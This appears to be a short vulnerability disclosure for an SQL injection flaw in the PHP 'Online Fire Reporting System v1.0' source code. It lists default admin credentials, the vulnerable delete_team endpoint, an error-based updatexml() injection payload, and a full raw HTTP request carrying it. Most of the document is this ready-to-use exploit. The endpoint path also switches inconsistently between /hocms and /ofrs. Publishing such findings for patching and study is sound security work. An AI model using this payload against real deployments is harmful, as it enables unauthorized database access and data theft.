# Online Fire Reporting System v1.0  has SQL injection vulnerability

Login account: admin/admin123

vendor : https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability file: /hocms/classes/Master.php?f=delete_team

![image-20220522140932086](https://s2.loli.net/2022/05/22/PvdoHJIiK3z2sVS.png)

Vulnerability location: /hocms/classes/Master.php?f=delete_team,id

[+]Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ //id is Injection point

```
POST /ofrs/classes/Master.php?f=delete_team HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://localhost
Connection: close
Referer: http://localhost/ofrs/classes/Master.php?f=delete_team
Cookie: UM_distinctid=17edc5ecd369-032851db15155a-4c3e237c-144000-17edc5ecd374b2; CNZZDATA585346=cnzz_eid%3D1638517557-1644367242-%26ntime%3D1644367242; PHPSESSID=0nngc9rh9jt0i53ha9ueig8r9c
Upgrade-Insecure-Requests: 1

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image-20220522124909156](https://s2.loli.net/2022/05/22/rwIaBFNYTug4keG.png)



![image-20220522132315454](https://s2.loli.net/2022/05/22/zXb5D7axf1SQhWC.png)

